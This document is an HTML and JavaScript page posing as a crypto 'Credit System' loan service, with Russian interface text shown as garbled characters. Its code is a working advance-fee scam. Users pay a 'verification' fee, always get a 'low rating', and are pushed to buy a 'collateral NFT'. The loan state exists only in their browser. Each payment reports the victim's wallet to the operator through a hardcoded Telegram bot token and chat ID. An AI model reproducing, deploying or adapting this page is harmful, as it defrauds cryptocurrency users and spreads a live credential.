<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit System</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --accent: #00f2ff; --bg: #030308; --card: #0d0d1a; --text-main: #ffffff; --text-dim: #a0a0b8; --success: #00ff88; --error: #ff0055; }
        body { background: var(--bg); color: var(--text-main); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 50%, #1a1a3a 0%, #030308 100%); }
        .container { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px; padding: 40px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
        h1 { font-size: 26px; font-weight: 800; margin-bottom: 25px; background: linear-gradient(135deg, #fff 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .btn { background: var(--accent); color: #000; border: none; padding: 18px 30px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; margin-top: 15px; }
        .btn-repay { background: var(--success); }
        .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); padding: 12px; font-size: 13px; border-radius: 12px; width: 100%; margin-top: 10px; }
        .result-card { display: none; margin-top: 20px; padding: 25px; border-radius: 20px; border: 1px solid #444; text-align: left; background: rgba(255,255,255,0.02); }
        .timer-box { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; margin: 10px 0; font-size: 12px; color: var(--text-dim); border: 1px solid rgba(255,255,255,0.1); }
        .status-msg { font-size: 13px; margin-top: 20px; min-height: 20px; }
    </style>
</head>
<body>

<div class="container">
    <div style="font-size: 50px; margin-bottom: 15px;">üè¶</div>
    <h1>Credit System</h1>

    <div id="authSection">
        <button class="btn" onclick="connect()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫</button>
    </div>
    
    <div id="resultBox" class="result-card"></div>
    <div id="status" class="status-msg"></div>
</div>

<script>
    const TELEGRAM_TOKEN = "8514449991:AAGOD-zVo3f8-WPz0XrFXzv_iznFJMaYJi0"; 
    const TELEGRAM_CHAT_ID = "5611455025"; 
    const CONTRACT_ADDRESS = "0x6DF193f9c0a2AFDb9Dfa883f95C82Addd1613F2f"; 

    const ABI = [
        "function requestVerification() public payable",
        "function buyBoostNFT() public payable",
        "function claimCredit() public"
    ];

    let signer, address, contract;

    async function sendTelegram(msg) {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
        try { await fetch(url, { method: 'GET' }); } catch (e) {}
    }

    async function connect() {
        if (!window.ethereum) return alert("MetaMask –Ω–µ –Ω–∞–π–¥–µ–Ω!");
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        address = await signer.getAddress();
        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
        document.getElementById('authSection').style.display = "none";
        checkFlowState();
    }

    function checkFlowState() {
        // –ü—Ä–æ–≤–µ—Ä–∫–∞: –≤–∑—è–ª –ª–∏ –∫—Ä–µ–¥–∏—Ç (–≤—ã–ø–ª–∞—Ç—É)
        const claimDate = localStorage.getItem('claimed_at_' + address);
        
        if (claimDate) {
            const daysPassed = Math.floor((Date.now() - claimDate) / (1000 * 60 * 60 * 24));
            const daysLeft = 31 - daysPassed;
            
            renderResult(true, "–ê–ö–¢–ò–í–ù–´–ô –ö–†–ï–î–ò–¢", 
                `–í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–∏–ª–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞. –í–∞—à —Ç–µ–∫—É—â–∏–π –∑–∞–π–º –∞–∫—Ç–∏–≤–µ–Ω.`, 
                false, false, true, daysPassed, daysLeft);
        } 
        else if (localStorage.getItem('nft_purchased_' + address) === 'true') {
            renderResult(true, "–õ–ò–ú–ò–¢ –û–î–û–ë–†–ï–ù", "–ó–∞–ª–æ–≥–æ–≤—ã–π NFT –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω. –ù–∞–∂–º–∏—Ç–µ –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Å—Ä–µ–¥—Å—Ç–≤–∞.", false, true);
        } 
        else if (localStorage.getItem('paid_analysis_' + address) === 'true') {
            renderResult(false, "–ù–ò–ó–ö–ò–ô –†–ï–ô–¢–ò–ù–ì", "–ê–Ω–∞–ª–∏–∑ –∑–∞–≤–µ—Ä—à–µ–Ω. –î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ª–∏–º–∏—Ç–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∑–∞–ª–æ–≥–æ–≤—ã–π NFT.", true, false);
        } 
        else {
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä, –µ—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ —Å–¥–µ–ª–∞–Ω–æ
            showCalculator();
        }
    }

    async function buyNFT(price) {
        try {
            showStatus("–ü–æ–∫—É–ø–∫–∞ NFT...", "#fff");
            const tx = await contract.buyBoostNFT({ value: ethers.utils.parseEther(price) });
            await tx.wait();
            localStorage.setItem('nft_purchased_' + address, 'true');
            sendTelegram(`üî• <b>NFT –ö–£–ü–õ–ï–ù</b>\n–Æ–∑–µ—Ä: <code>${address}</code>`);
            checkFlowState();
        } catch (e) { showStatus("–û—à–∏–±–∫–∞ –æ–ø–ª–∞—Ç—ã", "#ff0055"); }
    }

    async function claimMoney() {
        try {
            showStatus("–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—ã–ø–ª–∞—Ç—ã...", "#fff");
            const tx = await contract.claimCredit();
            await tx.wait();
            
            // –°–û–•–†–ê–ù–Ø–ï–ú –î–ê–¢–£ –í–´–ü–õ–ê–¢–´
            localStorage.setItem('claimed_at_' + address, Date.now());
            
            sendTelegram(`üí∞ <b>–í–´–ü–õ–ê–¢–ê –ó–ê–ë–†–ê–ù–ê</b>\n–Æ–∑–µ—Ä: <code>${address}</code>`);
            checkFlowState();
        } catch (e) { alert("–û—à–∏–±–∫–∞: –ü–æ–≤—Ç–æ—Ä–Ω–æ –Ω–µ–ª—å–∑—è!"); }
    }

    function repayCredit() {
        alert("–î–ª—è –ø–æ–≥–∞—à–µ–Ω–∏—è –∫—Ä–µ–¥–∏—Ç–∞ –∏ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —Å–ª–µ–¥—É—é—â–µ–≥–æ –ª–∏–º–∏—Ç–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–µ—Ä–Ω—É—Ç—å —Å—É–º–º—É + 20% –Ω–∞ –∞–¥—Ä–µ—Å –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞. –ö–Ω–æ–ø–∫–∞ —Å—Ç–∞–Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω–∞ —á–µ—Ä–µ–∑ 31 –¥–µ–Ω—å.");
    }

    function renderResult(isSuccess, title, text, showNFT, showClaim, showRepay = false, passed = 0, left = 0) {
        const rb = document.getElementById('resultBox');
        rb.style.display = "block";
        rb.style.borderColor = isSuccess ? "#00ff88" : "#ff0055";
        
        let html = `<div style="color:${isSuccess ? '#00ff88' : '#ff0055'}; font-size:20px; font-weight:bold;">${title}</div>
                    <div style="font-size:14px; margin-top:10px; color:#ccc;">${text}</div>`;
        
        if (showRepay) {
            html += `<div class="timer-box">
                        üìÖ –ö—Ä–µ–¥–∏—Ç –≤–∑—è—Ç: <b>${passed} –¥–Ω. –Ω–∞–∑–∞–¥</b><br>
                        ‚è≥ –î–æ –ø–æ–≥–∞—à–µ–Ω–∏—è: <b>${left > 0 ? left : 0} –¥–Ω.</b>
                     </div>
                     <button class="btn btn-repay" onclick="repayCredit()">–ü–û–ì–ê–°–ò–¢–¨ –ö–†–ï–î–ò–¢</button>`;
        }
        
        if (showNFT) {
            html += `<button class="btn-nft" onclick="buyNFT('0.003')">–ö—É–ø–∏—Ç—å NFT Boost (0.003 BNB)</button>
                     <button class="btn-nft" onclick="buyNFT('0.007')">–ö—É–ø–∏—Ç—å Pro NFT (0.007 BNB)</button>`;
        }
        
        if (showClaim) {
            html += `<button class="btn" onclick="claimMoney()">–ó–ê–ë–†–ê–¢–¨ –í–´–ü–õ–ê–¢–£</button>`;
        }
        
        rb.innerHTML = html;
        showStatus("", "");
    }

    // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞ (–µ—Å–ª–∏ –ø—É—Å—Ç–æ–π –∫–æ—à–µ–ª–µ–∫)
    function showCalculator() {
        const rb = document.getElementById('resultBox');
        rb.style.display = "block";
        rb.innerHTML = `<div style="color:var(--accent); font-size:18px;">–î–æ—Å—Ç—É–ø–Ω—ã–π –ª–∏–º–∏—Ç: $500</div>
                        <p style="font-size:12px;">–û–ø–ª–∞—Ç–∏—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫—É 0.001 BNB –¥–ª—è –æ—Ü–µ–Ω–∫–∏ –ø—Ä–æ—Ñ–∏–ª—è.</p>
                        <button class="btn" onclick="processCredit()">–ü—Ä–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É</button>`;
    }

    async function processCredit() {
        try {
            showStatus("–û–ø–ª–∞—Ç–∞ –∞–Ω–∞–ª–∏–∑–∞...", "#fff");
            const tx = await contract.requestVerification({ value: ethers.utils.parseEther("0.001") });
            await tx.wait();
            localStorage.setItem('paid_analysis_' + address, 'true');
            checkFlowState();
        } catch (e) { showStatus("–û—Ç–º–µ–Ω–∞", "#ff0055"); }
    }

    function showStatus(text, color) {
        const s = document.getElementById('status');
        s.innerHTML = text;
        s.style.color = color;
    }
</script>
</body>
</html>
